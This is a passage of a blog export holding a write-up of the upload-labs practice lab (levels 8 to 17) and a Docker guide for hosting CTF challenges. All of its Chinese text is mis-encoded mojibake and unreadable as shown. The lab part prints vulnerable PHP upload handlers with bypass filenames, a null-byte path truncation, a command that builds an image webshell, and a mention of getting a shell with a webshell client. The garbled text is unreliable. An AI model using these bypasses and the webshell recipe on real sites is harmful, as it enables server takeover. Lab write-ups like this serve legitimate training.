//é¦–å°¾å»ç©º\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n**Pass-08ä¸Pass-09ä»£ç å¯¹æ¯”**\n![](https://i.loli.net/2019/07/11/5d26a0be9756512346.png)\nå¯¹æ¯”å‘ç°ä»£ç åç¼€åå¤„ç†çš„ä¸å¤Ÿä¸¥è°¨, å…ˆå»é™¤äº†æ–‡ä»¶åé¢çš„`.` å†å»é™¤äº†æ–‡ä»¶åç¼€çš„ç©ºæ ¼, ç”±äºåªå¤„ç†äº†ä¸€æ¬¡, æ‰€ä»¥å¯ä»¥é€šè¿‡ä¸Šä¼ `9.php. .`è™½ç„¶æœ‰å»æœ«å°¾ç‚¹å’Œå»é¦–å°¾ç©ºæ ¼çš„æ“ä½œ\nä½†æ˜¯å¹¶ä¸æ˜¯å¾ªç¯å¤„ç†çš„\næ‰€ä»¥å¯ä»¥è¿™æ ·æ„é€ `9.php. .`\nè¿™æ ·ç»è¿‡ä¸€è½®å¤„ç†åï¼Œå˜ä¸º`9.php.`\n![](https://i.loli.net/2019/07/11/5d26ac3cd04d742978.png)\n## Pass-10ï¼ˆåŒåç¼€åç»•è¿‡ï¼‰\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = str_ireplace($deny_ext,\"\", $file_name);\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = UPLOAD_PATH.'/'.$file_name;        \n        if (move_uploaded_file($temp_file, $img_path)) {\n            $is_upload = true;\n        } else {\n            $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\nå‘ç°å…³é”®ç‚¹\n```php\n$file_name = str_ireplace($deny_ext,\"\", $file_name);\n\n//å°†æ–‡ä»¶åï¼ˆ$file_nameï¼‰ä¸­å«æœ‰é»‘åå•ï¼ˆ$deny_extï¼‰çš„æ›¿æ¢ä¸º\"\"ï¼ˆåˆ é™¤é»‘åå•å­—ç¬¦ï¼‰\n```\nä½†æ˜¯ä»£ç å¹¶æœªå¾ªç¯è¿‡æ»¤ï¼Œäºæ˜¯å­˜åœ¨`10.pphphp`\n![](https://i.loli.net/2019/07/11/5d26c459dae9d18308.png)\nèœåˆ€è¿æ¥\n![](https://i.loli.net/2019/07/11/5d26c459b690b50978.png)\ngetshell\n![](https://i.loli.net/2019/07/11/5d26c459c8b8169526.png)\n## Pass-11ï¼ˆ%00æˆªæ–­ç»•è¿‡ï¼‰\n```php\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n        }\n    } else{\n        $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\";\n    }\n}\n```\nå‘ç°å…³é”®ç‚¹\n```php\n $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n \n ä¸Šä¼ æ–‡ä»¶è·¯å¾„ç”±è·¯å¾„+æ—¶é—´+åç¼€é‡æ–°å‘½å\n```\n1.PHP ç‰ˆæœ¬ < 5.3.4\n2.php.ini ä¸­ magic_quotes_gpc=off\næ»¡è¶³ä¸Šé¢çš„æ¡ä»¶çš„æ—¶å€™phpå°±æ˜¯æŠŠ%00å½“æˆç»“æŸç¬¦ï¼Œåé¢çš„æ•°æ®ç›´æ¥å¿½ç•¥\nsave_pathå¯æ§ï¼Œå› æ­¤00æˆªæ–­å³å¯ã€‚åˆ©ç”¨save_path=../upload/11.php%00\n![](https://i.loli.net/2019/07/11/5d26c459c992b49149.png)\nç°åœ¨è²Œä¼¼æˆåŠŸä¸äº†\n## Pass-12ï¼ˆåŒä¸Š%00æˆªæ–­ï¼‰\n```php\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"ä¸Šä¼ å¤±è´¥\";\n        }\n    } else {\n        $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\";\n    }\n}\n```\n**Pass-11ä¸Pass-12ä»£ç å¯¹æ¯”**\n![](https://i.loli.net/2019/07/13/5d294778b4d2086258.png)\nè¿™é¢˜è·Ÿä¸Šä¸€é¢˜ä»£ç å”¯ä¸€çš„ä¸åŒå°±æ˜¯`save_path` ä» GET å˜æˆäº† POST, æ­¤æ—¶ä¸èƒ½å†ä½¿ç”¨ %00 æˆªæ–­, åŸå› æ˜¯ %00 æˆªæ–­åœ¨ GET ä¸­è¢« url è§£ç ä¹‹åæ˜¯ç©ºå­—ç¬¦, ä½†æ˜¯åœ¨ POST ä¸­ %00 ä¸ä¼šè¢« url è§£ç , æ‰€ä»¥åªèƒ½é€šè¿‡ burpsuite ä¿®æ”¹ hex å€¼ä¸º 00 è¿›è¡Œæˆªæ–­.\nåœ¨uploadåé¢åŠ ä¸Š12.php+(æ·»åŠ +æ˜¯ä¸ºäº†æ–¹ä¾¿æ”¹hexå€¼)\n![](https://i.loli.net/2019/07/13/5d294eff861fc79140.png)\nè¿™é‡ŒæŠŠ 2b('+'çš„ hex) ä¿®æ”¹æˆ 00\n![](https://i.loli.net/2019/07/13/5d294f73f2a9189616.png)\næˆ–è€…ç›´æ¥åœ¨uploadåé¢åŠ ä¸Š`12.php%00`ï¼Œç„¶åé€‰ä¸­%00å®æ–½`URL-decode`\n![](https://i.loli.net/2019/07/13/5d29606da9cc397060.png)\nç”±äºç¯å¢ƒæ²¡é…å¥½ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰æˆåŠŸï¼Œä½†æ˜¯åŸç†æ˜¯è¿™æ ·çš„\nç½‘ä¸Šæ‰¾çš„åˆ«äººæˆåŠŸçš„å›¾\n\n![](https://i.loli.net/2019/07/13/5d29560c6acab89069.png)\n`$img_path = $_POST['save_path'].\"/\".rand(10,99).date(\"YmdHis\").\".\".$file_ext;` \nå…¶ä¸­`\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;`ä¼šè¢«æˆªæ–­\n## Pass-13ï¼ˆå›¾ç‰‡é©¬ï¼‰\n```php\nfunction getReailFileType($filename){\n    $file = fopen($filename, \"rb\");\n    $bin = fread($file, 2); //åªè¯»2å­—èŠ‚\n    fclose($file);\n    $strInfo = @unpack(\"C2chars\", $bin);    \n    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    \n    $fileType = '';    \n    switch($typeCode){      \n        case 255216:            \n            $fileType = 'jpg';\n            break;\n        case 13780:            \n            $fileType = 'png';\n            break;        \n        case 7173:            \n            $fileType = 'gif';\n            break;\n        default:            \n            $fileType = 'unknown';\n        }    \n        return $fileType;\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_type = getReailFileType($temp_file);\n\n    if($file_type == 'unknown'){\n        $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"ä¸Šä¼ å‡ºé”™ï¼\";\n        }\n    }\n}\n```\nè¿™å…³ä¸»è¦æ˜¯åˆ©ç”¨äº†ä¸€ä¸ªåˆ¤æ–­æ–‡ä»¶çš„å‡½æ•°\n`fopen`æ‰“å¼€æ–‡ä»¶æ•°æ®æµ\n`fread`è¯»å–2ä¸ªå­—èŠ‚\nç”¨`unpack`å¯¹äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œè§£åŒ…ï¼Œ`C`ä»£è¡¨æ— ç¬¦å·å­—èŠ‚å‹ï¼Œåé¢çš„2ä»£è¡¨ä¸ªæ•°ï¼Œä¹Ÿå¯ä»¥ç”¨`*`ä»£æ›¿\næŠŠä¸¤ä¸ª`chars`è¿æ¥èµ·æ¥å†ç”¨`intval`è½¬æ¢ä¸ºæ•´æ•°å‹\nåšä¸€ä¸ªå›¾ç‰‡é©¬å°±å¯ä»¥ç»•è¿‡\n**å›¾ç‰‡é©¬åˆ¶ä½œ**\n**æ–¹æ³•ä¸€ï¼š**\næˆ‘ä»¬éœ€è¦ä¸€å¼ å›¾ç‰‡`1.jpg `å’Œä¸€å¥è¯æœ¨é©¬å†™å¥½çš„phpæ–‡ä»¶`1.php` \nå°†1.jpgå’Œ1.phpæ”¾åˆ°åŒä¸€ç›®å½•ä¸‹,\nç„¶ååœ¨è¯¥ç›®å½•ä¸‹ç”¨cmdæ‰§è¡Œå‘½ä»¤`copy 1.jpg/b + 1.php/a 2.jpg `\næ–°ç”Ÿæˆçš„2.jpgå°±æ˜¯æˆ‘ä»¬åˆ¶ä½œå¥½çš„å›¾ç‰‡é©¬\n![](https://i.loli.net/2019/07/13/5d295bd449c1993400.png)\n**æ–¹æ³•äºŒ**ï¼š\nHxDæ‰“å¼€ä¸€å¼ å›¾ç‰‡`1.jpg`\n![](https://i.loli.net/2019/07/13/5d295be59cb6829409.png)\nåœ¨å›¾ç‰‡æœ«å°¾åŠ ä¸Šä¸€å¥è¯æœ¨é©¬ï¼Œä¿å­˜å¾—åˆ°çš„å›¾ç‰‡å°±æ˜¯å›¾ç‰‡é©¬äº†\n![](https://i.loli.net/2019/07/13/5d295c7214fb631104.png)\n## Pass-14ï¼ˆçªç ´exif_imagetypeï¼‰\n```php\nfunction isImage($filename){\n    $types = '.jpeg|.png|.gif';\n    if(file_exists($filename)){\n        $info = getimagesize($filename);\n        $ext = image_type_to_extension($info[2]);\n        if(stripos($types,$ext)){\n            return $ext;\n        }else{\n            return false;\n        }\n    }else{\n        return false;\n    }\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $res = isImage($temp_file);\n    if(!$res){\n        $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"ä¸Šä¼ å‡ºé”™ï¼\";\n        }\n    }\n}\n```\ngetimagesizeåˆ¤æ–­å›¾ç‰‡å†…ç½®å‡½æ•°,æ‰€ä»¥ä¸€æ ·å¯ä»¥ä½¿ç”¨å›¾ç‰‡é©¬ç»•è¿‡.å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£http://php.net/manual/zh/function.getimagesize.php\n\nimage_type_to_extensionå–æ–‡ä»¶åç¼€çš„å†…ç½®å‡½æ•°http://php.net/manual/zh/function.image-type-to-extension.php\n## Pass-15ï¼ˆçªç ´exif_imagetypeï¼‰\n```php\nfunction isImage($filename){\n    //éœ€è¦å¼€å¯php_exifæ¨¡å—\n    $image_type = exif_imagetype($filename);\n    switch ($image_type) {\n        case IMAGETYPE_GIF:\n            return \"gif\";\n            break;\n        case IMAGETYPE_JPEG:\n            return \"jpg\";\n            break;\n        case IMAGETYPE_PNG:\n            return \"png\";\n            break;    \n        default:\n            return false;\n            break;\n    }\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $res = isImage($temp_file);\n    if(!$res){\n        $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"ä¸Šä¼ å‡ºé”™ï¼\";\n        }\n    }\n}\n```\nexif_imagetype ä¹Ÿæ˜¯åˆ¤æ–­å›¾ç‰‡çš„ç±»å‹çš„ï¼Œæ‰€ä»¥ä¸€æ ·å¯ä»¥ä½¿ç”¨å›¾ç‰‡é©¬ç»•è¿‡.å…·ä½“å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£http://php.net/manual/zh/function.exif-imagetype.php\n## Pass-16ï¼ˆå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ï¼‰\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])){\n    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„\n    $filename = $_FILES['upload_file']['name'];\n    $filetype = $_FILES['upload_file']['type'];\n    $tmpname = $_FILES['upload_file']['tmp_name'];\n\n    $target_path=UPLOAD_PATH.basename($filename);\n\n    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å\n    $fileext= substr(strrchr($filename,\".\"),1);\n\n    //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ\n    if(($fileext == \"jpg\") && ($filetype==\"image/jpeg\")){\n        if(move_uploaded_file($tmpname,$target_path))\n        {\n            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡\n            $im = imagecreatefromjpeg($target_path);\n\n            if($im == false){\n                $msg = \"è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼\";\n                @unlink($target_path);\n            }else{\n                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å\n                srand(time());\n                $newfilename = strval(rand()).\".jpg\";\n                $newimagepath = UPLOAD_PATH.$newfilename;\n                imagejpeg($im,$newimagepath);\n                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰\n                $img_path = UPLOAD_PATH.$newfilename;\n                @unlink($target_path);\n                $is_upload = true;\n            }\n        } else {\n            $msg = \"ä¸Šä¼ å‡ºé”™ï¼\";\n        }\n\n```\nä¸‰æ®µä»£å·®ä¸å¤šï¼Œå–å…¶ä¸­çš„ä¸€æ®µæ¥åˆ†æ`$target_path`å·²ç»ç”¨äº†`basename`æ¥é™åˆ¶ä½ ä¿®æ”¹ç›®å½•ç»•è¿‡çš„æ–¹æ³•äº†ã€‚\n`$fileext`ä»¥ç‚¹ä¸ºç•Œï¼Œå–ç‚¹åé¢çš„å­—ç¬¦ä½œä¸ºåç¼€åã€‚\n\nå˜é‡`$filetype`è·å–çš„å€¼å–åˆ¤æ–­`content-type`æ˜¯å¦ç¬¦åˆæ¡ä»¶\n\n`imagecreatefromjpeg`åˆ¤æ–­æ˜¯å¦ä¸ºå›¾ç‰‡èµ„æºï¼Œå…·ä½“å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£http://php.net/manual/zh/function.imagecreatefromjpeg.php\n\n`srand(time())`çœ‹å®˜æ–¹æ–‡æ¡£http://php.net/manual/zh/function.srand.phpï¼Œå’Œä¸‹é¢çš„[strval](http://www.php.net/manual/zh/function.strval.php)`(rand())` ç›¸ç»“åˆï¼Œéšæœºæ•°å‘ç”Ÿå™¨çš„åˆå§‹åŒ–ï¼Œä¸ºäº†è®©ä¸Šä¼ çš„éšæœºæ–‡ä»¶åä¸é‡å¤ã€‚\n`imagecreatefromjpeg`äºŒæ¬¡æ¸²æŸ“å®ƒç›¸å½“äºæ˜¯æŠŠåŸæœ¬å±äºå›¾åƒæ•°æ®çš„éƒ¨åˆ†æŠ“äº†å‡ºæ¥ï¼Œå†ç”¨è‡ªå·±çš„API æˆ–å‡½æ•°è¿›è¡Œé‡æ–°æ¸²æŸ“åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­éå›¾åƒæ•°æ®çš„éƒ¨åˆ†ç›´æ¥å°±éš”ç¦»å¼€äº†ã€‚\n\nè¯¦ç»†ç»•è¿‡æ–¹æ³•https://secgeek.net/bookfresh-vulnerability/\næ–‡ç« ä¸­æä¾›çš„å›¾ç‰‡é©¬`POC.gif`(åœ¨ä¸Šè¿°é“¾æ¥æ–‡ç« çš„æœ€åé¢æœ‰)\n![POC.gif](https://i.loli.net/2019/07/14/5d2aa57e5bb1e20848.gif)\nè§†é¢‘ç»•è¿‡æ¼”ç¤ºï¼ˆç¿»å¢™æ‰èƒ½çœ‹ï¼‰ï¼šhttps://youtu.be/z-_5a1wyPF0\n\n## Pass-17ï¼ˆæ¡ä»¶ç«äº‰ï¼Œå¤§æ‰¹é‡å‘åŒ…ç»•è¿‡ï¼‰\n```php\n$is_upload = false;\n$msg = null;\n\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_name = $_FILES['upload_file']['name'];\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_ext = substr($file_name,strrpos($file_name,\".\")+1);\n    $upload_file = UPLOAD_PATH . '/' . $file_name;\n\n    if(move_uploaded_file($temp_file, $upload_file)){\n        if(in_array($file_ext,$ext_arr)){\n             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n             rename($upload_file, $img_path);\n             $is_upload = true;\n        }else{\n            $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\";\n            unlink($upload_file);\n        }\n    }else{\n        $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n    }\n}\n```\né€šè¿‡ç™½åå•æ£€æµ‹åç¼€åï¼Œç¬¦åˆå°±renameæ”¹åï¼Œä¸ç¬¦åˆå°±unlinkåˆ é™¤æ–‡ä»¶ã€‚\n\n\nå‚è€ƒï¼š\n[Upload-labs&amp;Upload Bypass Summarize](https://cloud.tencent.com/developer/article/1377897)\n[Upload-Labsä¸Šä¼ ç»•è¿‡](http://www.bubuko.com/infodetail-2944836.html)\n[upload-labsåˆ·å…³è®°å½•](https://blog.csdn.net/u011377996/article/details/86776198)\n[upload-labs WriteUp](http://www.she1don.cn/index.php/archives/38.html)\n[å›¾ç‰‡æœ¨é©¬åˆ¶ä½œå¤§æ³•](http://gv7.me/articles/2017/picture-trojan-horse-making-method/)\n[upload-labs é€šå…³ç¬”è®°](https://getpass.cn/2018/11/24/upload-labs/)","tags":["é¶åœº","æ–‡ä»¶ä¸Šä¼ "],"categories":["Web"]},{"title":"Dockerä½¿ç”¨åŠéƒ¨ç½²CTFé¢˜ç›®","url":"/posts/50751.html","content":"Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼Œè®©å¼€å‘è€…å¯ä»¥æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªå¯ç§»æ¤çš„é•œåƒä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linuxæˆ–Windows æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£ã€‚\n\n## dockerå®‰è£…\n\n[å®˜æ–¹æ–‡æ¡£](https://docs.docker.com/engine/install/ubuntu/)\n\n```bash\n$ curl -fsSL get.docker.com -o get-docker.sh\n$ sudo sh get-docker.sh --mirror Aliyun\n```\n\n**æ£€éªŒDockeræ˜¯å¦å®‰è£…æˆåŠŸ**\n\n```python\n$ docker run hello-world\n\nUnable to find image 'hello-world:latest' locally\n...\nlatest: Pulling from library/hello-world\n1b930d010525: Pull complete \n...\n\nHello from Docker!\nThis message shows that your installation appears to be working correctly.\n...\n```\n\n- å¯åŠ¨docker\n\n  ```python\n  $ service docker start\n  ```\n\n## dockerå¸¸ç”¨å‘½ä»¤\n\n- ä»é•œåƒä»“åº“ä¸­æ‹‰å–æˆ–è€…æ›´æ–°æŒ‡å®šé•œåƒ\n```php\ndocker pull [OPTIONS] NAME[:TAG|@DIGEST]\n```\n```php\n    ä»Docker Hubä¸‹è½½javaæœ€æ–°ç‰ˆé•œåƒã€‚\n    docker pull java\n    \n    ä»Docker Hubä¸‹è½½REPOSITORYä¸ºjavaçš„æ‰€æœ‰é•œåƒã€‚\n    docker pull -a java```\n```\n\n- åˆ›å»ºé•œåƒ\n```php\ndocker build [options] path | url | - .(æœ€åçš„ç‚¹ä¸èƒ½ä¸¢)\negï¼šdocker build -t warmup .\neg: docker build -f /path/to/a/Dockerfile .\neg: docker build github.com/creack/docker-firefox\n```\n- æ–°å»ºä¸€ä¸ªdockerå®¹å™¨ï¼Œå¹¶æ˜ å°„ç«¯å£å·ã€‚\n```php\ndocker run [options] [host port]:[docker port] [image]\nç”¨åˆ°çš„optionï¼š -d åå°è¿è¡Œ\n               -P éšæœºæŠŠå®¹å™¨çš„ç«¯å£æ˜ å°„åˆ°ä¸€ä¸ªä¸»æœºæœªä½¿ç”¨çš„é«˜ç«¯å£\n               -p æ ¼å¼ä¸ºä¸»æœºç«¯å£ï¼šå®¹å™¨ç«¯å£ ï¼Œè‡ªé€‰ç«¯å£æ˜ å°„\n               -i  ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œå¸¸ä¸-tè¿ç”¨\n               -t  ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œå¸¸ä¸-iè¿ç”¨\negï¼šdocker run -i -d -P warmup \neg: docker run -d -p 100:80 -p 32768:80 warmup\n```\n- æŸ¥çœ‹æœ¬åœ°çš„dockeré•œåƒ\n```php\ndocker images æˆ–è€… docker image ls\n```\n- æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„dockerå®¹å™¨ã€‚\n```php\ndocker ps\n```\n- å¯åŠ¨/åœæ­¢ä¸€ä¸ªdockerå®¹å™¨ã€‚\n```php\ndocker start [container id]\ndocker stop  [container id]\n```\n- åˆ é™¤ä¸€ä¸ªdockerå®¹å™¨ã€‚ï¼ˆæ³¨æ„ï¼šéœ€è¦å…ˆæŠŠå®¹å™¨åœæ­¢æ‰å¯ä»¥åˆ é™¤ã€‚ï¼‰\n```php\ndocker rm [container id]\n```\n- å®¹å™¨ä¸ä¸»æœº(æœåŠ¡å™¨ï¼Œä¸æ˜¯è‡ªå·±çš„PC)ä¹‹é—´çš„æ•°æ®æ‹·è´\n```php\ndocker cp  dest_path [container id]:container_path ##ä¸»æœºcpåˆ°å®¹å™¨\ndocker cp  [container id]:container_path dest_path ##å®¹å™¨cpåˆ°ä¸»æœº\n```\n```php\nå°†ä¸»æœº/www/runoobç›®å½•æ‹·è´åˆ°å®¹å™¨96f7f14e99abçš„/wwwç›®å½•ä¸‹\ndocker cp /www/runoob 96f7f14e99ab:/www/\n\n å°†å®¹å™¨96f7f14e99abçš„/wwwç›®å½•æ‹·è´åˆ°ä¸»æœºçš„/tmpç›®å½•ä¸­\ndocker cp 96f7f14e99ab:/www /tmp/\n\n å°†ä¸»æœº/www/runoobç›®å½•æ‹·è´åˆ°å®¹å™¨96f7f14e99abä¸­ï¼Œç›®å½•é‡å‘½åä¸ºwww\ndocker cp /www/runoob 96f7f14e99ab:/www\n```\n## dockeréƒ¨ç½²CTFé¢˜ç›®\nç”±äºè¦éƒ¨ç½²webé¢˜ï¼Œæ‰€ä»¥é€‰æ‹©äº†ä¸€ä¸ªapache-php5\n```php\ndocker pull registry.cn-hangzhou.aliyuncs.com/lxepoo/apache-php5\n```\nç„¶åè¿è¡Œé•œåƒï¼Œå¹¶ç»‘å®šä¸€ä¸‹ç«¯å£ã€‚\n```php\ndocker run -d -p 8085:80 registry.cn-hangzhou.aliyuncs.com/lxepoo/apache-php5\n```\næ­¤æ—¶ä¼šè¿”å›ä¸€ä¸ªå€¼ï¼Œè¡¨ç¤ºè¯¥è¿è¡Œdockerçš„idã€‚ä»¥åå¦‚æœæƒ³è®¿é—®è¿™ä¸ªå®¹å™¨ï¼Œéœ€è¦é€šè¿‡è¯¥idã€‚\nä¹Ÿå¯é€šè¿‡`docker ps `æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œå¾—åˆ°å®¹å™¨id\n\n    ç„¶åå°†æœ¬åœ°æºç æ–‡ä»¶æ‹·è´åˆ°dockerï¼Œä½¿ç”¨dockerçš„cpå‘½ä»¤ï¼ˆåœ¨idå‰å‡ ä½æ²¡æœ‰é‡å¤çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å–å‰å‡ ä½ã€‚ï¼‰\n```php\ndocker cp ./ f7d233:/var/www/\n```\n- è¿›å…¥dockerå®¹å™¨å†…éƒ¨.\n```php\ndocker exec -it f7d233 bash\n\n    -d :åˆ†ç¦»æ¨¡å¼: åœ¨åå°è¿è¡Œ\n    -i :å³ä½¿æ²¡æœ‰é™„åŠ ä¹Ÿä¿æŒSTDIN æ‰“å¼€\n    -t :åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯\n```\n- é€€å‡ºdockerå®¹å™¨å†…éƒ¨.\n```php\nCtrl+p+q\n```\n\n\n\n\nå‚è€ƒï¼š\n[èœé¸Ÿæ•™ç¨‹-Docker å‘½ä»¤å¤§å…¨](http://www.runoob.com/docker/docker-tutorial.html)\n[é€šè¿‡dockeréƒ¨ç½²ctfé¢˜ç›® ](http://blog.5am3.com/2017/12/08/SCodeCTF/)\n[è®°dockerå¤ç°CTFé¢˜çš„ä¸€æ¬¡æµç¨‹](https://blog.csdn.net/weixin_40871137/article/details/86609153)\n\n","tags":["docker"],"categories":["Tools"]}]